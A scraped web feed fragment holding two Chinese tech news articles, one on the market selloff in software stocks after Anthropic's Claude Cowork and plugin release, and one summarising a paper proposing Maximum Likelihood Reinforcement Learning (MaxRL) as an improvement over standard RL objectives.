table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>AI 在代替人类之前，先要替代一大波软件？</p>
<p>昨夜，整个华尔街陷入了恐慌，Anthropic 发布的新一代人工智能工具「Claude Cowork」及其配套的 11 款职能插件正式上线，被市场视为 AI 从「辅助工具（Copilot）」向「独立员工（Agent）」跨越的分水岭，直接动摇了 SaaS 软件的商业根基。</p>
<p>从甲骨文、Adobe、Salesforce 到汤森路透、NEC，一系列人们耳熟能详的知名公司股票遭到抛售。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecdad619ac3d45e48bc33e8b245fb4ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=04tAaZ%2B3m%2FFQFHLdbKicGnWvrfI%3D" alt="图片" loading="lazy"/></p>
<p>作为智能体时代的 AI 工具，Claude Cowork 远远超越了大模型聊天机器人的范畴。Cowork 可以直接在你的电脑上帮你干活，它拥有足够高的权限，可以接管你的鼠标、键盘和文件系统，按照你的模糊指令，自主规划并完成一连串复杂的工作。</p>
<p>另一方面，与最近很火的开源项目 ClawdBot 不同在于，为了防止 AI 误删文件或通过联网完成人们预料之外的操作，Claude Cowork 运行在隔离的虚拟机（VM）环境中。</p>
<p>这是一个更加严肃，一上来就被设计为用来干活的智能体。Anthropic 为 Claude Cowork 准备了一系列「职业技能包」，其表示，这些工具可以生成财务报表、研究销售线索、准备销售电话、起草客户支持回复、评估保密协议，以及审查合同、法律简报和构建财务模型。</p>
<p>初看起来，这些说法和过去很多大模型、智能体发布时 AI 公司宣传的情况类似。在 1 月 12 日 Claude Cowork 的「研究预览版」首次亮相时，大家只觉得这是一个性能更强的自动化工具。</p>
<p>然而到了 1 月 31 号，Anthropic 发布 11 款官方开源插件时，有人发现事情并没有这么简单。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d3e79f839c043b787a4062a43fdceec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=Fn7ip4IK4Y1oznUt10X6J2MydxA%3D" alt="图片" loading="lazy"/></p>
<p>Anthropic 为其「桌面级全能数字员工」Claude Cowork 智能体平台发布了一系列插件（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fknowledge-work-plugins%25EF%25BC%2589%25EF%25BC%258C%25E8%25AF%25A5%25E5%2585%25AC%25E5%258F%25B8%25E5%25A3%25B0%25E7%25A7%25B0%25E8%25BF%2599%25E4%25BA%259B%25E6%258F%2592%25E4%25BB%25B6%25E5%258F%25AF%25E4%25BB%25A5%25E8%2587%25AA%25E5%258A%25A8%25E6%2589%25A7%25E8%25A1%258C%25E6%2595%25B0%25E5%258D%2581%25E9%25A1%25B9%25E4%25BB%25BB%25E5%258A%25A1%25EF%25BC%258C%25E5%258C%2585%25E6%258B%25AC%25E5%25AE%25A2%25E6%2588%25B7%25E6%259C%258D%25E5%258A%25A1%25E3%2580%2581%25E4%25BA%25A7%25E5%2593%2581%25E7%25AE%25A1%25E7%2590%2586%25E3%2580%2581%25E5%25B8%2582%25E5%259C%25BA%25E8%2590%25A5%25E9%2594%2580%25E3%2580%2581%25E6%25B3%2595%25E5%25BE%258B%25E5%2592%258C%25E6%2595%25B0%25E6%258D%25AE%25E5%2588%2586%25E6%259E%2590%25E7%25AD%2589%25E5%25B7%25A5%25E4%25BD%259C%25E3%2580%2582" target="_blank" title="https://github.com/anthropics/knowledge-work-plugins%EF%BC%89%EF%BC%8C%E8%AF%A5%E5%85%AC%E5%8F%B8%E5%A3%B0%E7%A7%B0%E8%BF%99%E4%BA%9B%E6%8F%92%E4%BB%B6%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E6%89%A7%E8%A1%8C%E6%95%B0%E5%8D%81%E9%A1%B9%E4%BB%BB%E5%8A%A1%EF%BC%8C%E5%8C%85%E6%8B%AC%E5%AE%A2%E6%88%B7%E6%9C%8D%E5%8A%A1%E3%80%81%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E3%80%81%E5%B8%82%E5%9C%BA%E8%90%A5%E9%94%80%E3%80%81%E6%B3%95%E5%BE%8B%E5%92%8C%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%AD%89%E5%B7%A5%E4%BD%9C%E3%80%82" ref="nofollow noopener noreferrer">github.com/anthropics/…</a></p>
<p>和之前宣传说的差不多？然而这次人们开始担心，支撑科技和数字服务行业发展的软件服务（SaaS）商业模式即将面临颠覆性风险。</p>
<p>华尔街担心，像 Claude 插件这样的 AI 工具会挑战现有软件公司的数据分析和研究产品 —— 利用 AI 实现自动化并构建自有工具的公司可能会减少对外部研究和数据服务的订阅，这将直接损害软件公司的利润。</p>
<p>周二遭遇全面抛售后，标普 500 软件和服务指数板块下跌近 4%，连续第六个交易日下跌，自 1 月 28 日以来市值蒸发约 8300 亿美元。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/faa381774ab8447890b8c639e2f09b9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=cDY5QlRxPyw50fDiqIXFjWXduEw%3D" alt="图片" loading="lazy"/></p>
<p>AI 工具最终是否会摧毁软件行业，目前尚无定论。但本周二，投资者们的恐慌是实实在在的，人们纷纷抛售法律和金融软件及服务公司的股票。毕竟，既然 AI 能减少内部开发所需的时间，那为什么还要为软件付费呢？</p>
<p>看起来，AI 对众多产业的革命正在具象化。今年 1 月，Anthropic 首席执行官达里奥・阿莫迪（Dario Amodei）就撰文认为「人工智能可能会在未来 1-5 年内取代一半的入门级白领工作」。</p>
<p>Anthropic 对此有多大的信心呢？他们昨天还强调了自己不会在 AI 里面加广告，宣传打到了超级碗，还顺带嘲讽了一波 OpenAI。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a24e50fe364e4f4a970c779903bdfc9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=9QQ9M0dpiQN3caFh7dH1oa7l15k%3D" alt="图片" loading="lazy"/></p>
<p>OpenAI 创始人、CEO 山姆・奥特曼不得不出来回应。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/840b925d3f3a4608926b406908bd7eb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=uiE43w0WvaC1Mb33MiesLv4RUOg%3D" alt="图片" loading="lazy"/></p>
<p>如此激烈的竞争，或许很快还会催生出更加强大的 AI 能力？</p>
<p>参考内容：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnn.com%2F2026%2F02%2F04%2Finvesting%2Fus-stocks-anthropic-software" target="_blank" title="https://www.cnn.com/2026/02/04/investing/us-stocks-anthropic-software" ref="nofollow noopener noreferrer">www.cnn.com/2026/02/04/…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.forbes.com%2Fsites%2Ftylerroush%2F2026%2F02%2F04%2Fglobal-software-stock-selloff-oracle-adobe-more-fueled-by-anthropics-new-ai-tools%2F" target="_blank" title="https://www.forbes.com/sites/tylerroush/2026/02/04/global-software-stock-selloff-oracle-adobe-more-fueled-by-anthropics-new-ai-tools/" ref="nofollow noopener noreferrer">www.forbes.com/sites/tyler…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.reuters.com%2Fbusiness%2Fmedia-telecom%2Fglobal-software-stocks-hit-by-anthropic-wake-up-call-ai-disruption-2026-02-04%2F" target="_blank" title="https://www.reuters.com/business/media-telecom/global-software-stocks-hit-by-anthropic-wake-up-call-ai-disruption-2026-02-04/" ref="nofollow noopener noreferrer">www.reuters.com/business/me…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fclaude-is-a-space-to-think" target="_blank" title="https://www.anthropic.com/news/claude-is-a-space-to-think" ref="nofollow noopener noreferrer">www.anthropic.com/news/claude…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[强化学习远不是最优，CMU刚刚提出最大似然强化学习]]></title>    <link>https://juejin.cn/post/7603195960254201856</link>    <guid>https://juejin.cn/post/7603195960254201856</guid>    <pubDate>2026-02-05T10:04:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254201856" data-draft-id="7603043152672669711" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="强化学习远不是最优，CMU刚刚提出最大似然强化学习"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T10:04:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            强化学习远不是最优，CMU刚刚提出最大似然强化学习
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:04:50.000Z" title="Thu Feb 05 2026 10:04:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在大模型时代，从代码生成到数学推理，再到自主规划的 Agent 系统，强化学习几乎成了「最后一公里」的标准配置。</p>
<p>直觉上，开发者真正想要的其实很简单：让模型更有可能生成「正确轨迹」。从概率角度看，这等价于最大化正确输出的概率，也就是经典的最大似然（Maximum Likelihood）目标。</p>
<p>然而，一项来自 CMU、清华大学、浙江大学等研究机构的最新工作指出了一个颇具颠覆性的事实：</p>
<p>现实中广泛使用的强化学习，并没有真正在做最大似然优化。严格的理论分析显示，强化学习只是在优化最大似然目标的一阶近似 —— 距离我们以为的最优训练目标，其实还差得很远。</p>
<p>正是基于这一观察，研究团队对强化学习的目标函数进行了重新审视，提出了最大似然强化学习（Maximum Likelihood Reinforcement Learning）：将基于正确性的强化学习重新刻画为一个潜变量生成的最大似然问题，进一步引入一族以计算量为索引的目标函数，使训练目标能够逐步逼近真正的最大似然优化。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cadc752b68a64997910e006f2fd7a8aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=%2F1DlYNvQCgEzdOjtGxgyI85ywxQ%3D" alt="图片" loading="lazy"/></p>
<ul>
<li>论文标题：Maximum Likelihood Reinforcement Learning</li>
</ul>

<ul>
<li>论文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2602.02710" target="_blank" title="https://arxiv.org/abs/2602.02710" ref="nofollow noopener noreferrer">arxiv.org/abs/2602.02…</a></li>
<li>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzanette-labs.github.io%2FMaxRL%2F" target="_blank" title="https://zanette-labs.github.io/MaxRL/" ref="nofollow noopener noreferrer">zanette-labs.github.io/MaxRL/</a></li>
</ul>

<ul>
<li>Github 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftajwarfahim%2Fmaxrl" target="_blank" title="https://github.com/tajwarfahim/maxrl" ref="nofollow noopener noreferrer">github.com/tajwarfahim…</a></li>
</ul>
<p>传统强化学习的「卡脖子」问题</p>
<p>在代码生成、数学推理、多步决策这些任务中，我们已经形成了一种几乎默认的共识：只要反馈是二值的、过程是不可微的，就用强化学习。</p>
<p>强化学习这套范式，支撑了从 AlphaGo 到大语言模型推理能力提升的一系列关键进展。</p>
<p>从端到端的角度看，强化学习就是给定一个输入，模型隐式地诱导出一个「成功概率」. 如果不考虑可微性约束，最自然、也最原则性的目标，就是最大似然。</p>
<p>但论文研究团队发现：基于期望奖励的强化学习，其实只是在优化最大似然目标的一阶近似。更具体地说，最大似然目标在总体层面可以展开为一系列以 pass@k 事件为基的项，而标准强化学习只优化了其中的一阶项。</p>
<p>简单来说，强化学习并没有真正最大化「模型生成正确答案的概率」，而是在优化一个与真实似然存在系统性偏差的替代目标。</p>
<p>这也解释了一个广泛存在却难以言说的现象：强化学习早期进展迅速，但越到后期，性能提升越困难。</p>
<p>研究团队针对这一新发现，对「基于正确性反馈的强化学习」进行了重新刻画，论文的主要贡献如下：</p>
<ul>
<li>
<p>将基于正确性的强化学习形式化为一个潜变量生成的最大似然问题，并证明标准强化学习仅优化了最大似然目标的一阶近似。</p>
</li>
<li>
<p>提出了一族以计算量为索引的目标函数，通过对 pass@k 事件进行 Maclaurin 展开，在期望回报与精确最大似然之间实现连续插值。</p>
</li>
<li>
<p>推导出一种简单的 on-policy 估计器，其期望梯度与该计算量索引的似然近似目标完全一致，这意味着增加采样真正改善了被优化的目标本身。</p>
</li>
</ul>
<p>最大似然：真正改进优化目标</p>
<p>研究团队认为，最大似然估计在有监督学习中表现卓越，为什么不直接在强化学习中实现它？</p>
<p>上一节中的观察启示我们：可以构造一个随计算量变化的目标函数族，逐步引入更高阶项；随着可用计算资源的增加，该目标函数族将逐渐收敛到完整的最大似然目标。</p>
<p>论文通过一系列推导，将最大似然目标在失败事件方面进行麦克劳林展开：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15027dfab74c467cac185924ae21de27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=lAGOOmUFD8QA5F%2FRj42aR5qxS5E%3D" alt="图片" loading="lazy"/></p>
<p>展开式中的最大似然梯度很难用有限样本进行估计。</p>
<p>特别是，估计大 k 值的 pass@k 梯度需要越来越多的样本，尤其是在通过率 p 很小的情况下。这种有限样本的困难正是提出最大似然强化学习（MaxRL）的动机所在。</p>
<p>研究团队将 MaxRL 定义为一类强化学习方法，它们显式地以最大似然为目标，而不是以通过率为目标，同时在有限采样和不可微生成的条件下仍然可实现。下面我们考虑一种实现该目标的原则性方法。</p>
<p>考虑通过将麦克劳林展开式截断为有限阶来近似最大似然目标，然后估计该目标。对于截断级别 T ∈N，我们将固定输入 x 的截断最大似然目标定义为：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e8ca76c3e1d4db5bdfbfbd82f61d074~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=pBlEMp4SQ%2FpWa46MRp2VY8wgquk%3D" alt="图片" loading="lazy"/></p>
<p>对其求导得到截断的总体梯度：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ea431e17eb243179a0bd55880585190~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=O3kyfBpNpRJ7QHeutjdMaIu2MK8%3D" alt="图片" loading="lazy"/></p>
<p>这定义了一族目标函数：T = 1 还原为强化学习，T → ∞ 还原为最大似然，中间的 T 值则在两者之间插值。因此，截断级别 T 直接控制了有助于学习的正确性事件的阶数。随着在 rollout 方面消耗更多的计算量，对更高阶梯度的估计变得可行。</p>
<p>换句话说： MaxRL 提供了一个原则性框架，用于通过增加计算量来换取对最大似然目标更高保真度的近似。</p>
<p>上述公式已经给出了一种可行的无偏估计思路：利用 pass@k 梯度估计器，对有限级数中的每一项分别进行近似。在这一策略下，任何对 pass@k 估计器的改进，都会直接转化为对截断最大似然目标的更优梯度估计。</p>
<p>不过，在本篇论文中，研究者采取了一条不同的路径，将带来更为简洁的估计器形式，同时也提供了一个新的理解视角。</p>
<p>最大似然目标的梯度可以写成如下的条件期望形式：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/891a414064c147ccbbb4f59745c8a76e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=6MKa78EYG9VNMG1pPjbRnuCtC38%3D" alt="图片" loading="lazy"/></p>
<p>该定理表明，最大似然梯度等价于仅对成功轨迹的梯度进行平均。这一解释为构造具体的梯度估计器提供了直接途径：只需用采样得到的成功轨迹，对上述条件期望进行样本平均即可。</p>
<p>其核心洞见在于：最大似然目标的梯度可以表示为在「成功条件分布」下的期望。</p>
<p>因此，本文采用了一种简单的策略：从非条件化的策略分布进行采样，但只对成功轨迹进行平均，得到了强化学习风格的估计器，其具备随着 rollout 数的增加，对最大似然梯度的近似将不断改善的特性。</p>
<p>换言之，在 MaxRL 框架下，额外的计算资源不仅改善了估计质量，更直接改进了被优化的目标本身。</p>
<p>令人惊讶的效率进步</p>
<p>在实验中，这一改变带来了远超预期的收益。研究团队在多个模型规模和多类任务上，对 MaxRL 进行了系统评估，结果显示：MaxRL 在性能与计算效率的权衡上均稳定地优于现有强化学习方法。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e654863de0054d30b11e8b752b25d53b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=2%2FPgs0gUTQA9SihYm4r%2BRFrHuvs%3D" alt="图片" loading="lazy"/></p>
<p>实验结果直观展示了 MaxRL 在训练效率上的优势。在相同训练步数下，MaxRL 性能提升明显更快，并且随着 rollout 数的增加，MaxRL 持续受益。</p>
<p>这种优势并不只体现在训练阶段，相较于使用 GRPO 训练的模型，MaxRL 测试时的 scaling 效率最高可提升 20 倍。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7c6251271f446c79fc748b61100747b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=2kEMNzyFsM4Gq7qP9n5mhh7D9wU%3D" alt="图片" loading="lazy"/></p>
<p>在迷宫任务上，无论测试时的采样预算 k 取何值，随着训练 rollouts 的增加，MaxRL 都能持续降低 −log (Pass@k)，而 GRPO 与 RLOO 的改进幅度则明显更早趋于平缓。这一结果直观地展示了 MaxRL 在训练阶段更优的性能–效率权衡。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78e0726f198541208b8013af80023669~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=z%2FHhlPeQrjkthjUed7usK3hKqFY%3D" alt="图片" loading="lazy"/></p>
<p>比较在不同 pass@k 设置下各方法随训练中采样计算增加时的优化趋势，可以看到，对于 GRPO 与 RLOO，曲线在早期下降后迅速变平，说明额外采样主要用于降低噪声；而 MaxRL 在不同 k 值下均保持持续下降，推动模型不断逼近一个更接近最大似然的优化目标。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/812a03f07a8644b3bc48061da1e9617a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=JlbK%2FwQWrwggYpWo%2FdDB84YH9NM%3D" alt="图片" loading="lazy"/></p>
<p>在更大规模设置下，MaxRL 的优势依然保持稳定。这表明，MaxRL 所带来的改进并非依赖于特定规模或超参数设置，当训练规模扩大时，MaxRL 并未出现收益递减过快或优势消失的现象。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc6b1c5ccece407c938dcb99cc72054a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=2cfyUBmpKhiyFaog8x%2B%2B5ofgGS8%3D" alt="图片" loading="lazy"/></p>
